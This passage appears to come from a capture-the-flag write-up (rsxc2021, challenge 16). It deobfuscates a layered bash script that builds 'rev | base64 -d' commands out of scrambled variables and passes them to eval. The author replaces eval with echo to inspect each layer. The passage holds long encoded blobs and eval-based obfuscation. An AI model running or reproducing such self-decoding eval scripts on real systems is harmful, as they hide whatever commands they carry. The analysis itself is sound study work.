' | r"</span><span class="token punctuation">;</span><span class="token assign-left variable">HxJ</span><span class="token operator">=</span><span class="token string">"s"</span><span class="token punctuation">;</span><span class="token assign-left variable">Hc2</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span><span class="token assign-left variable">f</span><span class="token operator">=</span><span class="token string">"as"</span><span class="token punctuation">;</span><span class="token assign-left variable">kcE</span><span class="token operator">=</span><span class="token string">"pas"</span><span class="token punctuation">;</span><span class="token assign-left variable">cEf</span><span class="token operator">=</span><span class="token string">"ae"</span><span class="token punctuation">;</span><span class="token assign-left variable">d</span><span class="token operator">=</span><span class="token string">"o"</span><span class="token punctuation">;</span><span class="token assign-left variable">V9z</span><span class="token operator">=</span><span class="token string">"6"</span><span class="token punctuation">;</span><span class="token assign-left variable">P8c</span><span class="token operator">=</span><span class="token string">"if"</span><span class="token punctuation">;</span><span class="token assign-left variable">U</span><span class="token operator">=</span><span class="token string">" -d"</span><span class="token punctuation">;</span><span class="token assign-left variable">Jc</span><span class="token operator">=</span><span class="token string">"ef"</span><span class="token punctuation">;</span><span class="token assign-left variable">N0q</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span><span class="token assign-left variable">v</span><span class="token operator">=</span><span class="token string">"b"</span><span class="token punctuation">;</span><span class="token assign-left variable">w</span><span class="token operator">=</span><span class="token string">"e"</span><span class="token punctuation">;</span><span class="token assign-left variable">b</span><span class="token operator">=</span><span class="token string">"v |"</span><span class="token punctuation">;</span><span class="token assign-left variable">Tx</span><span class="token operator">=</span><span class="token string">"Eds"</span><span class="token punctuation">;</span><span class="token assign-left variable">xZp</span><span class="token operator">=</span><span class="token string">""</span>
<span class="token assign-left variable">x</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$Hc2</span><span class="token variable">$w</span><span class="token variable">$c</span><span class="token variable">$rQW</span><span class="token variable">$d</span><span class="token variable">$s</span><span class="token variable">$w</span><span class="token variable">$b</span><span class="token variable">$Hc2</span><span class="token variable">$v</span><span class="token variable">$xZp</span><span class="token variable">$f</span><span class="token variable">$w</span><span class="token variable">$V9z</span><span class="token variable">$rQW</span><span class="token variable">$L</span><span class="token variable">$U</span><span class="token variable">$xZp</span>"</span><span class="token variable">)</span></span>
<span class="token builtin class-name">echo</span> <span class="token variable">$x</span> <span class="token operator">|</span> base64
<span class="token comment">#x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")</span>
<span class="token comment">#eval "$N0q$x$Hc2$rQW"</span></code><!-- HTML_TAG_END --></pre>
<pre class="language-shell"><!-- HTML_TAG_START --><code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token function">bash</span> <span class="token number">16</span>-challenge.sh <span class="token operator">|</span> base64 -d
<span class="token builtin class-name">echo</span> <span class="token string">'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 '</span> <span class="token operator">|</span> <span class="token function">rev</span> <span class="token operator">|</span>base64 -d</code><!-- HTML_TAG_END --></pre>
<p>Running this command output, we see something that resembles the source code of the bash script we just ran. But the variable <code>s</code> seemed to have changed.</p>
<pre class="language-shell"><!-- HTML_TAG_START --><code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token builtin class-name">echo</span> <span class="token string">'=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'</span> <span class="token operator">|</span> <span class="token function">rev</span> <span class="token operator">|</span> base64 -d
<span class="token assign-left variable">gH4</span><span class="token operator">=</span><span class="token string">"Ed"</span><span class="token punctuation">;</span><span class="token assign-left variable">kM0</span><span class="token operator">=</span><span class="token string">"xSz"</span><span class="token punctuation">;</span><span class="token assign-left variable">c</span><span class="token operator">=</span><span class="token string">"ch"</span><span class="token punctuation">;</span><span class="token assign-left variable">L</span><span class="token operator">=</span><span class="token string">"4"</span><span class="token punctuation">;</span><span class="token assign-left variable">rQW</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span><span class="token assign-left variable">fE1</span><span class="token operator">=</span><span class="token string">"lQ"</span><span class="token punctuation">;</span><span class="token assign-left variable">s</span><span class="token operator">=</span><span class="token string">" 'Kg2cgwHIk1CI0YTZzFmYgwHIis0ZyM2Z3hUS3FzQJlXMDl0aohUZndHSJhmQEpleRJTT4VlaOJTSt5kMRRkWysGVOJTWE5kMR1mTiEWY3RWbuF2dmFGJiISY3J3ZhRiIzcmaONTUE5kMN1mT41kaNpXSq5EakR1T6VkeNJSYhdHZt5WY3ZWYkIiaZJza61kMRRkTykVbOBTW65UMFpmTwMGVPpXWE5EMZJSY3J3ZhRiIzsmeNJTVUlVMJ1mT10kaNp3aU5kMZpWTxMGVOhmViE2dydWYkIieZRkT51EVPFTRy4kMVRlWyU0VOVTWU9keJpXT0UlIhdncnFGJioXVH5ENVRkTysmeOlXV61kenRlTx0ERPNzYE5EaWRlTz0UbONTUq1kMrpmT10kaOBTUq5EbaRkT6lkeNJSYhdHZt5WY3ZWYkICVOBTU65keNRVTxsGVOxmU6llMVRlT6lkaZpXUy00aORVTxklaOlmWq5EMR1mT1UlaOJTUq50aapWTyEkeORTW65EMRpmTqpFVNpXS61kIhF2dk1mbhdnZhRiIUl1MrpXT41kaNJTSt5UNNpmTwElaO1mWE5kMjRlT4lFRONza61kMRRkTyEkeOVTTq5UMFdlTppFVPpXS61UNVpmTykEVONTVUlVMBpXTyElaNp3aU5EakpmTxUVbOhmVU9kMrpXT51ERPFTQ61EbSR0TxElaOVzYq1UMNpXT0UFVOp3Z650MRRVWxUleOpmW65EMJpmT1kFVPpXWE5EMZRlWyEleNlXTq1kMVRkTwMmeNpXRU5UNVRlWw0UbOFTV61UeJJTTwMGRPNTU65EbKpnTyUkaOpmWq5kMZ1WTykFVOpXUq5kIhF2dk1mbhdnZhRiIU5kMBpXT10EROJTRq5UMNJSY3J3ZhRiI61keNFTWiE2dydWYkIieVpXT10ERPpXWq5kIhF2dk1mbhdnZhRiIq1keJpmT31keOpXTq5UeNR0T6NmeNFTWiE2dydWYkIiejpXTiEWY3RWbuF2dmFGJiQkTy0kaOdXTU1keNpmTiEWY3RWbuF2dmFGJiomTyUlaOhXTE5keNpXTy0keNJTU61UMZJSY3J3ZhRiI6VleNVTT61keJpmTw0EROJTTq5kMZRVTykkeNBTWE5keNpXTiEWY3RWbuF2dmFGJiISY3J3ZhRiI6lleNJSYhdHZt5WY3ZWYkIiaaJSYhdHZt5WY3ZWYkISbOxmWUpVeNpmT0MmeNNTS65UbKpmW5VkMNd3YE50MRpnT0klIhdncnFGJikXTt5UejRlTz0kaOdXSEV2dBlnYv50VaJCIvh2YltTeZ1TYhdHZt5WY3ZWY7QUT9E2dydWY
' | r"</span><span class="token punctuation">;</span><span class="token assign-left variable">HxJ</span><span class="token operator">=</span><span class="token string">"s"</span><span class="token punctuation">;</span><span class="token assign-left variable">Hc2</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span><span class="token assign-left variable">f</span><span class="token operator">=</span><span class="token string">"as"</span><span class="token punctuation">;</span><span class="token assign-left variable">kcE</span><span class="token operator">=</span><span class="token string">"pas"</span><span class="token punctuation">;</span><span class="token assign-left variable">cEf</span><span class="token operator">=</span><span class="token string">"ae"</span><span class="token punctuation">;</span><span class="token assign-left variable">d</span><span class="token operator">=</span><span class="token string">"o"</span><span class="token punctuation">;</span><span class="token assign-left variable">V9z</span><span class="token operator">=</span><span class="token string">"6"</span><span class="token punctuation">;</span><span class="token assign-left variable">P8c</span><span class="token operator">=</span><span class="token string">"if"</span><span class="token punctuation">;</span><span class="token assign-left variable">U</span><span class="token operator">=</span><span class="token string">" -d"</span><span class="token punctuation">;</span><span class="token assign-left variable">Jc</span><span class="token operator">=</span><span class="token string">"ef"</span><span class="token punctuation">;</span><span class="token assign-left variable">N0q</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span><span class="token assign-left variable">v</span><span class="token operator">=</span><span class="token string">"b"</span><span class="token punctuation">;</span><span class="token assign-left variable">w</span><span class="token operator">=</span><span class="token string">"e"</span><span class="token punctuation">;</span><span class="token assign-left variable">b</span><span class="token operator">=</span><span class="token string">"v |"</span><span class="token punctuation">;</span><span class="token assign-left variable">Tx</span><span class="token operator">=</span><span class="token string">"Eds"</span><span class="token punctuation">;</span><span class="token assign-left variable">xZp</span><span class="token operator">=</span><span class="token string">""</span>
<span class="token assign-left variable">x</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">eval</span> <span class="token string">"<span class="token variable">$Hc2</span><span class="token variable">$w</span><span class="token variable">$c</span><span class="token variable">$rQW</span><span class="token variable">$d</span><span class="token variable">$s</span><span class="token variable">$w</span><span class="token variable">$b</span><span class="token variable">$Hc2</span><span class="token variable">$v</span><span class="token variable">$xZp</span><span class="token variable">$f</span><span class="token variable">$w</span><span class="token variable">$V9z</span><span class="token variable">$rQW</span><span class="token variable">$L</span><span class="token variable">$U</span><span class="token variable">$xZp</span>"</span><span class="token variable">)</span></span>
<span class="token builtin class-name">eval</span> <span class="token string">"<span class="token variable">$N0q</span><span class="token variable">$x</span><span class="token variable">$Hc2</span><span class="token variable">$rQW</span>"</span></code><!-- HTML_TAG_END --></pre>
<p>Further I piped this bash output into a new file <code>16-challenge2.sh</code>, adding the neccessary edits and modifications to safely run the code:</p>
<pre class="language-bash"><!-- HTML_TAG_START --><code class="language-bash"><span class="token comment"># 16-challenge2.sh</span>
<span class="token assign-left variable">gH4</span><span class="token operator">=</span><span class="token string">"Ed"</span><span class="token punctuation">;</span><span class="token assign-left variable">kM0</span><span class="token operator">=</span><span class="token string">"xSz"</span><span class="token punctuation">;</span><span class="token assign-left variable">c</span><span class="token operator">=</span><span class="token string">"ch"</span><span class="token punctuation">;</span><span class="token assign-left variable">L</span><span class="token operator">=</span><span class="token string">"4"</span><span class="token punctuation">;</span><span class="token assign-left variable">rQW</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span><span class="token assign-left variable">fE1</span><span class="token operator">=</span><span class="token string">"lQ"</span><span class="token punctuation">;</span><span class="token assign-left variable">s</span><span class="token operator">=</span><span class="token string">" 'Kg2cgwHIk1CI0YTZzFmYgwHIis0ZyM2Z3hUS3FzQJlXMDl0aohUZndHSJhmQEpleRJTT4VlaOJTSt5kMRRkWysGVOJTWE5kMR1mTiEWY3RWbuF2dmFGJiISY3J3ZhRiIzcmaONTUE5kMN1mT41kaNpXSq5EakR1T6VkeNJSYhdHZt5WY3ZWYkIiaZJza61kMRRkTykVbOBTW65UMFpmTwMGVPpXWE5EMZJSY3J3ZhRiIzsmeNJTVUlVMJ1mT10kaNp3aU5kMZpWTxMGVOhmViE2dydWYkIieZRkT51EVPFTRy4kMVRlWyU0VOVTWU9keJpXT0UlIhdncnFGJioXVH5ENVRkTysmeOlXV61kenRlTx0ERPNzYE5EaWRlTz0UbONTUq1kMrpmT10kaOBTUq5EbaRkT6lkeNJSYhdHZt5WY3ZWYkICVOBTU65keNRVTxsGVOxmU6llMVRlT6lkaZpXUy00aORVTxklaOlmWq5EMR1mT1UlaOJTUq50aapWTyEkeORTW65EMRpmTqpFVNpXS61kIhF2dk1mbhdnZhRiIUl1MrpXT41kaNJTSt5UNNpmTwElaO1mWE5kMjRlT4lFRONza61kMRRkTyEkeOVTTq5UMFdlTppFVPpXS61UNVpmTykEVONTVUlVMBpXTyElaNp3aU5EakpmTxUVbOhmVU9kMrpXT51ERPFTQ61EbSR0TxElaOVzYq1UMNpXT0UFVOp3Z650MRRVWxUleOpmW65EMJpmT1kFVPpXWE5EMZRlWyEleNlXTq1kMVRkTwMmeNpXRU5UNVRlWw0UbOFTV61UeJJTTwMGRPNTU65EbKpnTyUkaOpmWq5kMZ1WTykFVOpXUq5kIhF2dk1mbhdnZhRiIU5kMBpXT10EROJTRq5UMNJSY3J3ZhRiI61keNFTWiE2dydWYkIieVpXT10ERPpXWq5kIhF2dk1mbhdnZhRiIq1keJpmT31keOpXTq5UeNR0T6NmeNFTWiE2dydWYkIiejpXTiEWY3RWbuF2dmFGJiQkTy0kaOdXTU1keNpmTiEWY3RWbuF2dmFGJiomTyUlaOhXTE5keNpXTy0keNJTU61UMZJSY3J3ZhRiI6VleNVTT61keJpmTw0EROJTTq5kMZRVTykkeNBTWE5keNpXTiEWY3RWbuF2dmFGJiISY3J3ZhRiI6lleNJSYhdHZt5WY3ZWYkIiaaJSYhdHZt5WY3ZWYkISbOxmWUpVeNpmT0MmeNNTS65UbKpmW5VkMNd3YE50MRpnT0klIhdncnFGJikXTt5UejRlTz0kaOdXSEV2dBlnYv50VaJCIvh2YltTeZ1TYhdHZt5WY3ZWY7QUT9E2dydWY
' | r"</span><span class="token punctuation">;</span><span class="token assign-left variable">HxJ</span><span class="token operator">=</span><span class="token string">"s"</span><span class="token punctuation">;</span><span class="token assign-left variable">Hc2</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span><span class="token assign-left variable">f</span><span class="token operator">=</span><span class="token string">"as"</span><span class="token punctuation">;</span><span class="token assign-left variable">kcE</span><span class="token operator">=</span><span class="token string">"pas"</span><span class="token punctuation">;</span><span class="token assign-left variable">cEf</span><span class="token operator">=</span><span class="token string">"ae"</span><span class="token punctuation">;</span><span class="token assign-left variable">d</span><span class="token operator">=</span><span class="token string">"o"</span><span class="token punctuation">;</span><span class="token assign-left variable">V9z</span><span class="token operator">=</span><span class="token string">"6"</span><span class="token punctuation">;</span><span class="token assign-left variable">P8c</span><span class="token operator">=</span><span class="token string">"if"</span><span class="token punctuation">;</span><span class="token assign-left variable">U</span><span class="token operator">=</span><span class="token string">" -d"</span><span class="token punctuation">;</span><span class="token assign-left variable">Jc</span><span class="token operator">=</span><span class="token string">"ef"</span><span class="token punctuation">;</span><span class="token assign-left variable">N0q</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span><span class="token assign-left variable">v</span><span class="token operator">=</span><span class="token string">"b"</span><span class="token punctuation">;</span><span class="token assign-left variable">w</span><span class="token operator">=</span><span class="token string">"e"</span><span class="token punctuation">;</span><span class="token assign-left variable">b</span><span class="token operator">=</span><span class="token string">"v |"</span><span class="token punctuation">;</span><span class="token assign-left variable">Tx</span><span class="token operator">=</span><span class="token string">"Eds"</span><span class="token punctuation">;</span><span class="token assign-left variable">xZp</span><span class="token operator">=</span><span class="token string">""</span>
<span class="token assign-left variable">x</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$Hc2</span><span class="token variable">$w</span><span class="token variable">$c</span><span class="token variable">$rQW</span><span class="token variable">$d</span><span class="token variable">$s</span><span class="token variable">$w</span><span class="token variable">$b</span><span class="token variable">$Hc2</span><span class="token variable">$v</span><span class="token variable">$xZp</span><span class="token variable">$f</span><span class="token variable">$w</span><span class="token variable">$V9z</span><span class="token variable">$rQW</span><span class="token variable">$L</span><span class="token variable">$U</span><span class="token variable">$xZp</span>"</span><span class="token variable">)</span></span>
<span class="token builtin class-name">echo</span> <span class="token variable">$x</span> <span class="token operator">|</span> base64
<span class="token comment">#eval "$N0q$x$Hc2$rQW"</span></code><!-- HTML_TAG_END --></pre>
<p>Running this script gave somewhat similar output as before, however when executing the output command we get something quite new:</p>
<pre class="language-shell"><!-- HTML_TAG_START --><code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token function">bash</span> <span class="token number">16</span>-challenge2.sh <span class="token operator">|</span> base64 -d
<span class="token builtin class-name">echo</span> <span class="token string">'Kg2cgwHIk1CI0YTZzFmYgwHIis0ZyM2Z3hUS3FzQJlXMDl0aohUZndHSJhmQEpleRJTT4VlaOJTSt5kMRRkWysGVOJTWE5kMR1mTiEWY3RWbuF2dmFGJiISY3J3ZhRiIzcmaONTUE5kMN1mT41kaNpXSq5EakR1T6VkeNJSYhdHZt5WY3ZWYkIiaZJza61kMRRkTykVbOBTW65UMFpmTwMGVPpXWE5EMZJSY3J3ZhRiIzsmeNJTVUlVMJ1mT10kaNp3aU5kMZpWTxMGVOhmViE2dydWYkIieZRkT51EVPFTRy4kMVRlWyU0VOVTWU9keJpXT0UlIhdncnFGJioXVH5ENVRkTysmeOlXV61kenRlTx0ERPNzYE5EaWRlTz0UbONTUq1kMrpmT10kaOBTUq5EbaRkT6lkeNJSYhdHZt5WY3ZWYkICVOBTU65keNRVTxsGVOxmU6llMVRlT6lkaZpXUy00aORVTxklaOlmWq5EMR1mT1UlaOJTUq50aapWTyEkeORTW65EMRpmTqpFVNpXS61kIhF2dk1mbhdnZhRiIUl1MrpXT41kaNJTSt5UNNpmTwElaO1mWE5kMjRlT4lFRONza61kMRRkTyEkeOVTTq5UMFdlTppFVPpXS61UNVpmTykEVONTVUlVMBpXTyElaNp3aU5EakpmTxUVbOhmVU9kMrpXT51ERPFTQ61EbSR0TxElaOVzYq1UMNpXT0UFVOp3Z650MRRVWxUleOpmW65EMJpmT1kFVPpXWE5EMZRlWyEleNlXTq1kMVRkTwMmeNpXRU5UNVRlWw0UbOFTV61UeJJTTwMGRPNTU65EbKpnTyUkaOpmWq5kMZ1WTykFVOpXUq5kIhF2dk1mbhdnZhRiIU5kMBpXT10EROJTRq5UMNJSY3J3ZhRiI61keNFTWiE2dydWYkIieVpXT10ERPpXWq5kIhF2dk1mbhdnZhRiIq1keJpmT31keOpXTq5UeNR0T6NmeNFTWiE2dydWYkIiejpXTiEWY3RWbuF2dmFGJiQkTy0kaOdXTU1keNpmTiEWY3RWbuF2dmFGJiomTyUlaOhXTE5keNpXTy0keNJTU61UMZJSY3J3ZhRiI6VleNVTT61keJpmTw0EROJTTq5kMZRVTykkeNBTWE5keNpXTiEWY3RWbuF2dmFGJiISY3J3ZhRiI6lleNJSYhdHZt5WY3ZWYkIiaaJSYhdHZt5WY3ZWYkISbOxmWUpVeNpmT0MmeNNTS65UbKpmW5VkMNd3YE50MRpnT0klIhdncnFGJikXTt5UejRlTz0kaOdXSEV2dBlnYv50VaJCIvh2YltTeZ1TYhdHZt5WY3ZWY7QUT9E2dydWY '</span> <span class="token operator">|</span> <span class="token function">rev</span> <span class="token operator">|</span>base64 -d
juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token builtin class-name">echo</span> <span class="token string">'Kg2cgwHIk1CI0YTZzFmYgwHIis0ZyM2Z3hUS3FzQJlXMDl0aohUZndHSJhmQEpleRJTT4VlaOJTSt5kMRRkWysGVOJTWE5kMR1mTiEWY3RWbuF2dmFGJiISY3J3ZhRiIzcmaONTUE5kMN1mT41kaNpXSq5EakR1T6VkeNJSYhdHZt5WY3ZWYkIiaZJza61kMRRkTykVbOBTW65UMFpmTwMGVPpXWE5EMZJSY3J3ZhRiIzsmeNJTVUlVMJ1mT10kaNp3aU5kMZpWTxMGVOhmViE2dydWYkIieZRkT51EVPFTRy4kMVRlWyU0VOVTWU9keJpXT0UlIhdncnFGJioXVH5ENVRkTysmeOlXV61kenRlTx0ERPNzYE5EaWRlTz0UbONTUq1kMrpmT10kaOBTUq5EbaRkT6lkeNJSYhdHZt5WY3ZWYkICVOBTU65keNRVTxsGVOxmU6llMVRlT6lkaZpXUy00aORVTxklaOlmWq5EMR1mT1UlaOJTUq50aapWTyEkeORTW65EMRpmTqpFVNpXS61kIhF2dk1mbhdnZhRiIUl1MrpXT41kaNJTSt5UNNpmTwElaO1mWE5kMjRlT4lFRONza61kMRRkTyEkeOVTTq5UMFdlTppFVPpXS61UNVpmTykEVONTVUlVMBpXTyElaNp3aU5EakpmTxUVbOhmVU9kMrpXT51ERPFTQ61EbSR0TxElaOVzYq1UMNpXT0UFVOp3Z650MRRVWxUleOpmW65EMJpmT1kFVPpXWE5EMZRlWyEleNlXTq1kMVRkTwMmeNpXRU5UNVRlWw0UbOFTV61UeJJTTwMGRPNTU65EbKpnTyUkaOpmWq5kMZ1WTykFVOpXUq5kIhF2dk1mbhdnZhRiIU5kMBpXT10EROJTRq5UMNJSY3J3ZhRiI61keNFTWiE2dydWYkIieVpXT10ERPpXWq5kIhF2dk1mbhdnZhRiIq1keJpmT31keOpXTq5UeNR0T6NmeNFTWiE2dydWYkIiejpXTiEWY3RWbuF2dmFGJiQkTy0kaOdXTU1keNpmTiEWY3RWbuF2dmFGJiomTyUlaOhXTE5keNpXTy0keNJTU61UMZJSY3J3ZhRiI6VleNVTT61keJpmTw0EROJTTq5kMZRVTykkeNBTWE5keNpXTiEWY3RWbuF2dmFGJiISY3J3ZhRiI6lleNJSYhdHZt5WY3ZWYkIiaaJSYhdHZt5WY3ZWYkISbOxmWUpVeNpmT0MmeNNTS65UbKpmW5VkMNd3YE50MRpnT0klIhdncnFGJikXTt5UejRlTz0kaOdXSEV2dBlnYv50VaJCIvh2YltTeZ1TYhdHZt5WY3ZWY7QUT9E2dydWY'</span> <span class="token operator">|</span> <span class="token function">rev</span> <span class="token operator">|</span>base64 -d
